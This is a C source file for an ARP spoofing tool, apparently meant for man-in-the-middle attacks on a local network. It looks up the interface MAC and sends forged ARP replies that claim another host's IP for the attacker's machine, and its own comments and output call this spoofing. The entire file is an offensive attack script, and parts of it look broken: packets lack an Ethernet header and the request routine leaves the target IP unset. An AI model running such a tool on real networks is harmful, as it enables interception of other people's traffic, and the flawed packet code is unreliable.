#include "middle.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>

#define ARP_REQUEST 1
#define ARP_REPLY 2
#define ARP_ETH_SIZE 6
#define ARP_IP_SIZE 4

struct arp_packet
{
    unsigned short hardware_type;
    unsigned short protocol_type;
    unsigned char hardware_size;
    unsigned char protocol_size;
    unsigned short opcode;
    unsigned char sender_mac[ARP_ETH_SIZE];
    unsigned char sender_ip[ARP_IP_SIZE];
    unsigned char target_mac[ARP_ETH_SIZE];
    unsigned char target_ip[ARP_IP_SIZE];
};

void get_mac_address(const char *iface, unsigned char *mac_addr)
{
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        perror("socket");
        exit(1);
    }

    strcpy(ifr.ifr_name, iface);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl");
        close(sockfd);
        exit(1);
    }

    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6); // Assuming MAC address is 6 bytes

    close(sockfd);
}

void send_arp_request(const char *iface, const char *target_ip)
{
    int sockfd;
    struct sockaddr_ll sa;
    struct arp_packet arp_pkt;

    // Create raw socket
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
    {
        perror("Failed to create socket");
        exit(1);
    }

    // Fill in ARP packet
    arp_pkt.hardware_type = htons(ARPHRD_ETHER);
    arp_pkt.protocol_type = htons(ETH_P_IP);
    arp_pkt.hardware_size = ARP_ETH_SIZE;
    arp_pkt.protocol_size = ARP_IP_SIZE;
    arp_pkt.opcode = htons(ARP_REQUEST);

    // Set sender MAC and IP
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("Failed to get interface MAC address");
        close(sockfd);
        exit(1);
    }

    memcpy(arp_pkt.sender_mac, ifr.ifr_hwaddr.sa_data, ARP_ETH_SIZE);

    // Prepare socket address structure
    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_nametoindex(iface);

    // Set target IP and broadcast MAC
    memset(arp_pkt.target_mac, 0xFF, ARP_ETH_SIZE); // Broadcast MAC address
    memcpy(arp_pkt.sender_ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr, ARP_IP_SIZE);

    // Print target IP address
    struct in_addr addr;
    addr.s_addr = inet_addr(target_ip);
    printf("Sending ARP request to IP: %s\n", inet_ntoa(addr));

    // Send ARP packet
    if (sendto(sockfd, &arp_pkt, sizeof(struct arp_packet), 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_ll)) < 0)
    {
        perror("Send failed");
        close(sockfd);
        exit(1);
    }

    // Wait for ARP reply
    unsigned char recv_buf[42];
    ssize_t num_bytes;

    while (1)
    {
        num_bytes = recv(sockfd, recv_buf, sizeof(recv_buf), 0);
        if (num_bytes < 0)
        {
            perror("Receive failed");
            close(sockfd);
            exit(1);
        }

        if (num_bytes >= sizeof(struct ether_header) + sizeof(struct arp_packet))
        {
            struct ether_header *eth_hdr = (struct ether_header *)recv_buf;
            if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP)
            {
                struct arp_packet *arp_reply = (struct arp_packet *)(recv_buf + sizeof(struct ether_header));
                if (ntohs(arp_reply->opcode) == ARP_REPLY &&
                    memcmp(arp_reply->sender_ip, arp_pkt.target_ip, ARP_IP_SIZE) == 0)
                {
                    printf("MAC Address of %s: %02x:%02x:%02x:%02x:%02x:%02x\n",
                           target_ip,
                           arp_reply->sender_mac[0], arp_reply->sender_mac[1], arp_reply->sender_mac[2],
                           arp_reply->sender_mac[3], arp_reply->sender_mac[4], arp_reply->sender_mac[5]);
                    break;
                }
            }
        }
    }

    close(sockfd);
}

void send_arp_response(const char *iface, const char *target_ip, const char *victim_ip)
{
    int sockfd;
    struct sockaddr_ll sa;
    struct arp_packet arp_pkt;

    // Create raw socket
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
    {
        perror("Failed to create socket");
        exit(1);
    }

    // Prepare socket address structure
    memset(&sa, 0, sizeof(struct sockaddr_ll));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_nametoindex(iface);

    // Fill in ARP packet
    arp_pkt.hardware_type = htons(ARPHRD_ETHER);
    arp_pkt.protocol_type = htons(ETH_P_IP);
    arp_pkt.hardware_size = ARP_ETH_SIZE;
    arp_pkt.protocol_size = ARP_IP_SIZE;
    arp_pkt.opcode = htons(ARP_REPLY);

    // Set attacker's MAC and IP
    unsigned char mac_addr[ARP_ETH_SIZE];
    get_mac_address(iface, mac_addr);
    memcpy(arp_pkt.sender_mac, mac_addr, ARP_ETH_SIZE);

    // Convert IP addresses from text to binary form
    inet_pton(AF_INET, target_ip, arp_pkt.target_ip);
    inet_pton(AF_INET, victim_ip, arp_pkt.sender_ip);

    // Set target MAC address to attacker's MAC
    memcpy(arp_pkt.target_mac, mac_addr, ARP_ETH_SIZE);

    // Send ARP response directly to the victim
    if (sendto(sockfd, &arp_pkt, sizeof(struct arp_packet), 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_ll)) < 0)
    {
        perror("Send failed");
        close(sockfd);
        exit(1);
    }

    printf("Sent ARP spoofed response to %s, pretending %s's MAC is my MAC address\n", victim_ip, target_ip);

    close(sockfd);
}

int main(int argc, char *argv[])
{
    if (argc != 4)
    {
        fprintf(stderr, "Usage: %s <interface> <target_ip> <victim_ip>\n", argv[0]);
        return 1;
    }

    const char *iface = argv[1];
    const char *target_ip = argv[2];
    const char *victim_ip = argv[3];

    unsigned char mac_addr[6];
    get_mac_address(iface, mac_addr);

    printf("MAC Address of %s: %02x:%02x:%02x:%02x:%02x:%02x\n",
           iface, mac_addr[0], mac_addr[1], mac_addr[2],
           mac_addr[3], mac_addr[4], mac_addr[5]);

    // send_arp_request(iface, target_ip);

    send_arp_response(iface, target_ip, victim_ip);

    return 0;
}